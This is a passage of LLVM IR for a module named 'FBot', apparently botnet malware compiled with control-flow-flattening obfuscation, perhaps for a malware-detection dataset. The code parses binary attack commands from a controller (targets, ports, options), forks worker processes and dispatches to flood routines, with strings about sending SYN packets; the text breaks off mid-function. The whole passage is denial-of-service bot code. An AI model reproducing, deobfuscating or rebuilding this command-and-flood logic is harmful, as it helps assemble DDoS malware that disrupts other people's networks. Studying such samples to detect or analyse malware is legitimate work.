; ModuleID = 'host/ir_fla/FBot.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.command = type { i8, i8* (...)* }
%struct.option = type { i8, i16, i8* }
%struct.target = type { i32, i16 }
%struct.arguments = type { %struct.target*, %struct.option*, i8, i8, i16 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.timeval = type { i64, i64 }

@LOCAL_ADDRESS = common global i32 0, align 4
@command_list = common global [6 x %struct.command] zeroinitializer, align 16
@.str = private unnamed_addr constant [34 x i8] c"Sending SYN with ACK: %d SEQ: %d\0A\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c"Received SYN-ACK with ACK: %d SEQ: %d\0A\00", align 1
@t = internal global i32 0, align 4
@p = internal global i32 0, align 4
@c = internal global i32 0, align 4
@f = internal global i32 0, align 4
@alpha_set = internal global [36 x i8] c"abcdefghijklmnopqrstuvwxyz0123456789", align 16

; Function Attrs: noinline nounwind uwtable
define i8* @retrieve_opt_str(%struct.option*, i8 zeroext, i8 zeroext, i8*) #0 {
  %5 = alloca %struct.option*, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store %struct.option* %0, %struct.option** %5, align 8
  store i8 %1, i8* %6, align 1
  store i8 %2, i8* %7, align 1
  store i8* %3, i8** %8, align 8
  store i32 0, i32* %10, align 4
  %11 = load i8*, i8** %8, align 8
  store i8* %11, i8** %9, align 8
  store i32 0, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1009425125, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1009425125, label %12
    i32 1571385024, label %18
    i32 585205299, label %30
    i32 -216298474, label %37
    i32 562565748, label %38
    i32 952617858, label %41
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i32, i32* %10, align 4
  %14 = load i8, i8* %6, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp slt i32 %13, %15
  %17 = select i1 %16, i32 1571385024, i32 952617858
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load %struct.option*, %struct.option** %5, align 8
  %20 = load i32, i32* %10, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds %struct.option, %struct.option* %19, i64 %21
  %23 = getelementptr inbounds %struct.option, %struct.option* %22, i32 0, i32 0
  %24 = load i8, i8* %23, align 8
  %25 = zext i8 %24 to i32
  %26 = load i8, i8* %7, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %25, %27
  %29 = select i1 %28, i32 585205299, i32 -216298474
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load %struct.option*, %struct.option** %5, align 8
  %32 = load i32, i32* %10, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds %struct.option, %struct.option* %31, i64 %33
  %35 = getelementptr inbounds %struct.option, %struct.option* %34, i32 0, i32 2
  %36 = load i8*, i8** %35, align 8
  store i8* %36, i8** %9, align 8
  store i32 -216298474, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 562565748, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %10, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %10, align 4
  store i32 -1009425125, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i8*, i8** %9, align 8
  ret i8* %42

loopEnd:                                          ; preds = %38, %37, %30, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @retrieve_opt_num(%struct.option*, i8 zeroext, i8 zeroext, i16 zeroext) #0 {
  %5 = alloca %struct.option*, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i16, align 2
  %9 = alloca i16, align 2
  %10 = alloca i32, align 4
  store %struct.option* %0, %struct.option** %5, align 8
  store i8 %1, i8* %6, align 1
  store i8 %2, i8* %7, align 1
  store i16 %3, i16* %8, align 2
  store i16 0, i16* %9, align 2
  store i32 0, i32* %10, align 4
  %11 = load i16, i16* %8, align 2
  store i16 %11, i16* %9, align 2
  store i32 0, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -810289384, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -810289384, label %12
    i32 1094820433, label %18
    i32 251398660, label %30
    i32 1700112586, label %39
    i32 -1115073916, label %40
    i32 600521038, label %43
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i32, i32* %10, align 4
  %14 = load i8, i8* %6, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp slt i32 %13, %15
  %17 = select i1 %16, i32 1094820433, i32 600521038
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load %struct.option*, %struct.option** %5, align 8
  %20 = load i32, i32* %10, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds %struct.option, %struct.option* %19, i64 %21
  %23 = getelementptr inbounds %struct.option, %struct.option* %22, i32 0, i32 0
  %24 = load i8, i8* %23, align 8
  %25 = zext i8 %24 to i32
  %26 = load i8, i8* %7, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %25, %27
  %29 = select i1 %28, i32 251398660, i32 1700112586
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load %struct.option*, %struct.option** %5, align 8
  %32 = load i32, i32* %10, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds %struct.option, %struct.option* %31, i64 %33
  %35 = getelementptr inbounds %struct.option, %struct.option* %34, i32 0, i32 2
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @atoi(i8* %36) #7
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %9, align 2
  store i32 1700112586, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 -1115073916, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %10, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %10, align 4
  store i32 -810289384, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i16, i16* %9, align 2
  ret i16 %44

loopEnd:                                          ; preds = %40, %39, %30, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @retrieve_opt_ipv4(%struct.option*, i8 zeroext, i8 zeroext, i32) #0 {
  %5 = alloca %struct.option*, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store %struct.option* %0, %struct.option** %5, align 8
  store i8 %1, i8* %6, align 1
  store i8 %2, i8* %7, align 1
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  %11 = load i32, i32* %8, align 4
  store i32 %11, i32* %9, align 4
  store i32 0, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -256035703, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -256035703, label %12
    i32 776969341, label %18
    i32 -1430466734, label %30
    i32 1690915855, label %38
    i32 1282736663, label %39
    i32 -960710500, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i32, i32* %10, align 4
  %14 = load i8, i8* %6, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp slt i32 %13, %15
  %17 = select i1 %16, i32 776969341, i32 -960710500
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load %struct.option*, %struct.option** %5, align 8
  %20 = load i32, i32* %10, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds %struct.option, %struct.option* %19, i64 %21
  %23 = getelementptr inbounds %struct.option, %struct.option* %22, i32 0, i32 0
  %24 = load i8, i8* %23, align 8
  %25 = zext i8 %24 to i32
  %26 = load i8, i8* %7, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %25, %27
  %29 = select i1 %28, i32 -1430466734, i32 1690915855
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load %struct.option*, %struct.option** %5, align 8
  %32 = load i32, i32* %10, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds %struct.option, %struct.option* %31, i64 %33
  %35 = getelementptr inbounds %struct.option, %struct.option* %34, i32 0, i32 2
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @inet_addr(i8* %36) #8
  store i32 %37, i32* %9, align 4
  store i32 1690915855, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 1282736663, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %10, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %10, align 4
  store i32 -256035703, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %9, align 4
  ret i32 %43

loopEnd:                                          ; preds = %39, %38, %30, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @command_parse(i8*, i32) #0 {
  %.reg2mem = alloca %struct.target*
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca %struct.option*, align 8
  %8 = alloca %struct.target*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8, align 1
  %11 = alloca i16, align 2
  %12 = alloca i16, align 2
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i8 0, i8* %5, align 1
  store i8 0, i8* %6, align 1
  store %struct.option* null, %struct.option** %7, align 8
  store %struct.target* null, %struct.target** %8, align 8
  store i32 0, i32* %9, align 4
  store i8 0, i8* %10, align 1
  store i16 0, i16* %11, align 2
  %13 = load i8*, i8** %3, align 8
  %14 = load i8, i8* %13, align 1
  store i8 %14, i8* %5, align 1
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 1
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = sub i64 %18, 1
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* %4, align 4
  %21 = load i8*, i8** %3, align 8
  %22 = bitcast i8* %21 to i16*
  %23 = load i16, i16* %22, align 2
  store i16 %23, i16* %11, align 2
  %24 = load i16, i16* %11, align 2
  %25 = call zeroext i16 @ntohs(i16 zeroext %24) #9
  store i16 %25, i16* %11, align 2
  %26 = load i8*, i8** %3, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 2
  store i8* %27, i8** %3, align 8
  %28 = load i32, i32* %4, align 4
  %29 = sext i32 %28 to i64
  %30 = sub i64 %29, 2
  %31 = trunc i64 %30 to i32
  store i32 %31, i32* %4, align 4
  %32 = load i8*, i8** %3, align 8
  %33 = load i8, i8* %32, align 1
  store i8 %33, i8* %6, align 1
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  store i8* %35, i8** %3, align 8
  %36 = load i32, i32* %4, align 4
  %37 = sext i32 %36 to i64
  %38 = sub i64 %37, 1
  %39 = trunc i64 %38 to i32
  store i32 %39, i32* %4, align 4
  %40 = load i8, i8* %6, align 1
  %41 = zext i8 %40 to i64
  %42 = call noalias i8* @calloc(i64 %41, i64 8) #8
  %43 = bitcast i8* %42 to %struct.target*
  store %struct.target* %43, %struct.target** %8, align 8
  %44 = load %struct.target*, %struct.target** %8, align 8
  store %struct.target* %44, %struct.target** %.reg2mem
  %switchVar = alloca i32
  store i32 -1631331535, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1631331535, label %first
    i32 2131872623, label %47
    i32 -1927736640, label %48
    i32 1066855493, label %49
    i32 1837415411, label %55
    i32 -1788468548, label %96
    i32 -746718305, label %99
    i32 1230103265, label %112
    i32 1405800398, label %119
    i32 331928039, label %127
    i32 382912899, label %130
    i32 1300176414, label %131
    i32 -1917742577, label %137
    i32 906526531, label %199
    i32 -1824445262, label %202
    i32 1455139219, label %209
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.target*, %struct.target** %.reg2mem
  %45 = icmp ne %struct.target* %.reload, null
  %46 = select i1 %45, i32 -1927736640, i32 2131872623
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1455139219, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1066855493, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %9, align 4
  %51 = load i8, i8* %6, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp slt i32 %50, %52
  %54 = select i1 %53, i32 1837415411, i32 -746718305
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i8*, i8** %3, align 8
  %57 = bitcast i8* %56 to i32*
  %58 = load i32, i32* %57, align 4
  %59 = load %struct.target*, %struct.target** %8, align 8
  %60 = load i32, i32* %9, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.target, %struct.target* %59, i64 %61
  %63 = getelementptr inbounds %struct.target, %struct.target* %62, i32 0, i32 0
  store i32 %58, i32* %63, align 4
  %64 = load i8*, i8** %3, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 4
  store i8* %65, i8** %3, align 8
  %66 = load i32, i32* %4, align 4
  %67 = sext i32 %66 to i64
  %68 = sub i64 %67, 4
  %69 = trunc i64 %68 to i32
  store i32 %69, i32* %4, align 4
  %70 = load i8*, i8** %3, align 8
  %71 = bitcast i8* %70 to i16*
  %72 = load i16, i16* %71, align 2
  %73 = load %struct.target*, %struct.target** %8, align 8
  %74 = load i32, i32* %9, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.target, %struct.target* %73, i64 %75
  %77 = getelementptr inbounds %struct.target, %struct.target* %76, i32 0, i32 1
  store i16 %72, i16* %77, align 4
  %78 = load %struct.target*, %struct.target** %8, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.target, %struct.target* %78, i64 %80
  %82 = getelementptr inbounds %struct.target, %struct.target* %81, i32 0, i32 1
  %83 = load i16, i16* %82, align 4
  %84 = call zeroext i16 @ntohs(i16 zeroext %83) #9
  %85 = load %struct.target*, %struct.target** %8, align 8
  %86 = load i32, i32* %9, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.target, %struct.target* %85, i64 %87
  %89 = getelementptr inbounds %struct.target, %struct.target* %88, i32 0, i32 1
  store i16 %84, i16* %89, align 4
  %90 = load i8*, i8** %3, align 8
  %91 = getelementptr inbounds i8, i8* %90, i64 2
  store i8* %91, i8** %3, align 8
  %92 = load i32, i32* %4, align 4
  %93 = sext i32 %92 to i64
  %94 = sub i64 %93, 2
  %95 = trunc i64 %94 to i32
  store i32 %95, i32* %4, align 4
  store i32 -1788468548, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %9, align 4
  %98 = add nsw i32 %97, 1
  store i32 %98, i32* %9, align 4
  store i32 1066855493, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %3, align 8
  %101 = load i8, i8* %100, align 1
  store i8 %101, i8* %10, align 1
  %102 = load i8*, i8** %3, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 1
  store i8* %103, i8** %3, align 8
  %104 = load i32, i32* %4, align 4
  %105 = sext i32 %104 to i64
  %106 = sub i64 %105, 1
  %107 = trunc i64 %106 to i32
  store i32 %107, i32* %4, align 4
  %108 = load i8, i8* %10, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp eq i32 %109, 0
  %111 = select i1 %110, i32 1230103265, i32 1405800398
  store i32 %111, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i8, i8* %5, align 1
  %114 = load %struct.option*, %struct.option** %7, align 8
  %115 = load i8, i8* %10, align 1
  %116 = load %struct.target*, %struct.target** %8, align 8
  %117 = load i8, i8* %6, align 1
  %118 = load i16, i16* %11, align 2
  call void @command_flood(i8 zeroext %113, %struct.option* %114, i8 zeroext %115, %struct.target* %116, i8 zeroext %117, i16 zeroext %118)
  store i32 1455139219, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i8, i8* %10, align 1
  %121 = zext i8 %120 to i64
  %122 = call noalias i8* @calloc(i64 %121, i64 16) #8
  %123 = bitcast i8* %122 to %struct.option*
  store %struct.option* %123, %struct.option** %7, align 8
  %124 = load %struct.option*, %struct.option** %7, align 8
  %125 = icmp ne %struct.option* %124, null
  %126 = select i1 %125, i32 382912899, i32 331928039
  store i32 %126, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load %struct.target*, %struct.target** %8, align 8
  %129 = bitcast %struct.target* %128 to i8*
  call void @free(i8* %129) #8
  store i32 1455139219, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1300176414, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load i32, i32* %9, align 4
  %133 = load i8, i8* %10, align 1
  %134 = zext i8 %133 to i32
  %135 = icmp slt i32 %132, %134
  %136 = select i1 %135, i32 -1917742577, i32 -1824445262
  store i32 %136, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  store i16 0, i16* %12, align 2
  %138 = load i8*, i8** %3, align 8
  %139 = load i8, i8* %138, align 1
  %140 = load %struct.option*, %struct.option** %7, align 8
  %141 = load i32, i32* %9, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.option, %struct.option* %140, i64 %142
  %144 = getelementptr inbounds %struct.option, %struct.option* %143, i32 0, i32 0
  store i8 %139, i8* %144, align 8
  %145 = load i8*, i8** %3, align 8
  %146 = getelementptr inbounds i8, i8* %145, i64 1
  store i8* %146, i8** %3, align 8
  %147 = load i32, i32* %4, align 4
  %148 = sext i32 %147 to i64
  %149 = sub i64 %148, 1
  %150 = trunc i64 %149 to i32
  store i32 %150, i32* %4, align 4
  %151 = load i8*, i8** %3, align 8
  %152 = bitcast i8* %151 to i16*
  %153 = load i16, i16* %152, align 2
  store i16 %153, i16* %12, align 2
  %154 = load i16, i16* %12, align 2
  %155 = call zeroext i16 @ntohs(i16 zeroext %154) #9
  store i16 %155, i16* %12, align 2
  %156 = load i8*, i8** %3, align 8
  %157 = getelementptr inbounds i8, i8* %156, i64 2
  store i8* %157, i8** %3, align 8
  %158 = load i32, i32* %4, align 4
  %159 = sext i32 %158 to i64
  %160 = sub i64 %159, 2
  %161 = trunc i64 %160 to i32
  store i32 %161, i32* %4, align 4
  %162 = load i16, i16* %12, align 2
  %163 = zext i16 %162 to i32
  %164 = add nsw i32 %163, 1
  %165 = sext i32 %164 to i64
  %166 = call noalias i8* @malloc(i64 %165) #8
  %167 = load %struct.option*, %struct.option** %7, align 8
  %168 = load i32, i32* %9, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.option, %struct.option* %167, i64 %169
  %171 = getelementptr inbounds %struct.option, %struct.option* %170, i32 0, i32 2
  store i8* %166, i8** %171, align 8
  %172 = load %struct.option*, %struct.option** %7, align 8
  %173 = load i32, i32* %9, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.option, %struct.option* %172, i64 %174
  %176 = getelementptr inbounds %struct.option, %struct.option* %175, i32 0, i32 2
  %177 = load i8*, i8** %176, align 8
  %178 = load i8*, i8** %3, align 8
  %179 = load i16, i16* %12, align 2
  %180 = zext i16 %179 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %177, i8* %178, i64 %180, i32 1, i1 false)
  %181 = load %struct.option*, %struct.option** %7, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.option, %struct.option* %181, i64 %183
  %185 = getelementptr inbounds %struct.option, %struct.option* %184, i32 0, i32 2
  %186 = load i8*, i8** %185, align 8
  %187 = load i16, i16* %12, align 2
  %188 = zext i16 %187 to i64
  %189 = getelementptr inbounds i8, i8* %186, i64 %188
  store i8 0, i8* %189, align 1
  %190 = load i16, i16* %12, align 2
  %191 = zext i16 %190 to i32
  %192 = load i8*, i8** %3, align 8
  %193 = sext i32 %191 to i64
  %194 = getelementptr inbounds i8, i8* %192, i64 %193
  store i8* %194, i8** %3, align 8
  %195 = load i16, i16* %12, align 2
  %196 = zext i16 %195 to i32
  %197 = load i32, i32* %4, align 4
  %198 = sub nsw i32 %197, %196
  store i32 %198, i32* %4, align 4
  store i32 906526531, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = load i32, i32* %9, align 4
  %201 = add nsw i32 %200, 1
  store i32 %201, i32* %9, align 4
  store i32 1300176414, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %203 = load i8, i8* %5, align 1
  %204 = load %struct.option*, %struct.option** %7, align 8
  %205 = load i8, i8* %10, align 1
  %206 = load %struct.target*, %struct.target** %8, align 8
  %207 = load i8, i8* %6, align 1
  %208 = load i16, i16* %11, align 2
  call void @command_flood(i8 zeroext %203, %struct.option* %204, i8 zeroext %205, %struct.target* %206, i8 zeroext %207, i16 zeroext %208)
  store i32 1455139219, i32* %switchVar
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %202, %199, %137, %131, %130, %127, %119, %112, %99, %96, %55, %49, %48, %47, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #3

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #2

; Function Attrs: noinline nounwind uwtable
define internal void @command_flood(i8 zeroext, %struct.option*, i8 zeroext, %struct.target*, i8 zeroext, i16 zeroext) #0 {
  %.reg2mem = alloca i8* (...)*
  %7 = alloca i8, align 1
  %8 = alloca %struct.option*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca i16, align 2
  %13 = alloca i8* (...)*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.arguments, align 8
  store i8 %0, i8* %7, align 1
  store %struct.option* %1, %struct.option** %8, align 8
  store i8 %2, i8* %9, align 1
  store %struct.target* %3, %struct.target** %10, align 8
  store i8 %4, i8* %11, align 1
  store i16 %5, i16* %12, align 2
  store i32 -1, i32* %14, align 4
  store i32 -1, i32* %15, align 4
  %17 = load i8, i8* %7, align 1
  %18 = call i8* (...)* @retrieve_command_func(i8 zeroext %17)
  store i8* (...)* %18, i8* (...)** %13, align 8
  %19 = load i8* (...)*, i8* (...)** %13, align 8
  store i8* (...)* %19, i8* (...)** %.reg2mem
  %switchVar = alloca i32
  store i32 -517402873, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -517402873, label %first
    i32 -1542602503, label %22
    i32 -1008637443, label %23
    i32 1689901517, label %38
    i32 -1974657891, label %39
    i32 1641392068, label %43
    i32 -107399027, label %44
    i32 -1250399511, label %49
    i32 -780063187, label %50
    i32 1545703852, label %54
    i32 1147399983, label %55
    i32 -1990973081, label %59
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8* (...)*, i8* (...)** %.reg2mem
  %20 = icmp ne i8* (...)* %.reload, null
  %21 = select i1 %20, i32 -1008637443, i32 -1542602503
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 -1990973081, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load %struct.target*, %struct.target** %10, align 8
  %25 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 0
  store %struct.target* %24, %struct.target** %25, align 8
  %26 = load i8, i8* %9, align 1
  %27 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 2
  store i8 %26, i8* %27, align 8
  %28 = load i8, i8* %11, align 1
  %29 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 3
  store i8 %28, i8* %29, align 1
  %30 = load %struct.option*, %struct.option** %8, align 8
  %31 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 1
  store %struct.option* %30, %struct.option** %31, align 8
  %32 = load i16, i16* %12, align 2
  %33 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 4
  store i16 %32, i16* %33, align 2
  %34 = call i32 @fork() #8
  store i32 %34, i32* %14, align 4
  %35 = load i32, i32* %14, align 4
  %36 = icmp eq i32 %35, -1
  %37 = select i1 %36, i32 1689901517, i32 -1974657891
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 -1990973081, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %14, align 4
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 1641392068, i32 -107399027
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1990973081, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = call i32 @fork() #8
  store i32 %45, i32* %15, align 4
  %46 = load i32, i32* %15, align 4
  %47 = icmp eq i32 %46, -1
  %48 = select i1 %47, i32 -1250399511, i32 -780063187
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  call void @exit(i32 1) #10
  unreachable

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %15, align 4
  %52 = icmp eq i32 %51, 0
  %53 = select i1 %52, i32 1545703852, i32 1147399983
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  call void @terminate_command(%struct.arguments* %16)
  store i32 1147399983, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i8* (...)*, i8* (...)** %13, align 8
  %57 = bitcast i8* (...)* %56 to i8* (%struct.arguments*, ...)*
  %58 = call i8* (%struct.arguments*, ...) %57(%struct.arguments* %16)
  store i32 -1990973081, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %55, %54, %50, %44, %43, %39, %38, %23, %22, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @free(i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define internal i8* (...)* @retrieve_command_func(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = zext i8 %3 to i64
  %5 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %4
  %6 = getelementptr inbounds %struct.command, %struct.command* %5, i32 0, i32 1
  %7 = load i8* (...)*, i8* (...)** %6, align 8
  ret i8* (...)* %7
}

; Function Attrs: nounwind
declare i32 @fork() #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #5

; Function Attrs: noinline nounwind uwtable
define internal void @terminate_command(%struct.arguments*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
